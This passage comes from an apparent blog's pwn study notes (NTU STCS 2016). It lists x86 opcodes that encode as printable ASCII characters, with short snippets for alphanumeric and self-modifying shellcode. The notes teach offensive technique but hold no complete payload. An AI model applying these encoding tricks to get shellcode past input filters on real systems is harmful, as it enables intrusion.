DWORD PTR ds:[esi]p   70 41                   jo     0x43q   71 41                   jno    0x43r   72 41                   jb     0x43s   73 41                   jae    0x43t   74 41                   je     0x43u   75 41                   jne    0x43v   76 41                   jbe    0x43w   77 41                   ja     0x43x   78 41                   js     0x43y   79 41                   jns    0x43z   7a 41                   jp     0x43A   41                      inc    ecxB   42                      inc    edxC   43                      inc    ebxD   44                      inc    espE   45                      inc    ebpF   46                      inc    esiG   47                      inc    ediH   48                      dec    eaxI   49                      dec    ecxJ   4a                      dec    edxK   4b                      dec    ebxL   4c                      dec    espM   4d                      dec    ebpN   4e                      dec    esiO   4f                      dec    ediP   50                      push   eaxQ   51                      push   ecxR   52                      push   edxS   53                      push   ebxT   54                      push   espU   55                      push   ebpV   56                      push   esiW   57                      push   ediX   58                      pop    eaxY   59                      pop    ecxZ   5a                      pop    edx0   30 41 42                xor    BYTE PTR [ecx+0x42], al1   31 41 42                xor    DWORD PTR [ecx+0x42], eax2   32 41 42                xor    al, BYTE PTR [ecx+0x42]3   33 41 42                xor    eax, DWORD PTR [ecx+0x42]4   34 41                   xor    al, 0x415   35 41 42 43 44          xor    eax, 0x444342416   36 41                   ss inc ecx7   37                      aaa    8   38 41 42                cmp    BYTE PTR [ecx+0x42], al9   39 41 42                cmp    DWORD PTR [ecx+0x42], eax</code></pre><p>Register赋值</p><pre><code>PQRSTUVWa0:  50      push  eax1:  51      push  ecx2:  52      push  edx  3:  53      push  ebx4:  54      push  esp5:  55      push  ebp6:  56      push  esi7:  57      push  edi8:  61      popa</code></pre><p>自修改shellcode</p><pre><code>jDX0A10:  6a 44       push  0x442:  58          pop   eax3:  30 41 31    xor   BYTE PTR [ecx+0x31],al</code></pre><p>eax赋值</p><pre><code>jDX4C0:  6a 44       push  0x442:  58          pop   eax3:  34 43       xor   al,0x43</code></pre>]]></content>
      
      
      <categories>
          
          <category> NTU STCS 2016学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
